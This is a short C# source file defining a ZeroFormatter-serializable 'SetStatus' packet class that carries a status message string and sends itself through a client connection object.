using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ClientPackets
{
    [ZeroFormattable]
    public class SetStatus : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.SetStatus;
            }
        }

        [Index(0)]
        public virtual string message { get; set; }

        public SetStatus()
        {
        }

        public SetStatus(string message)
        {
            this.message = message;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
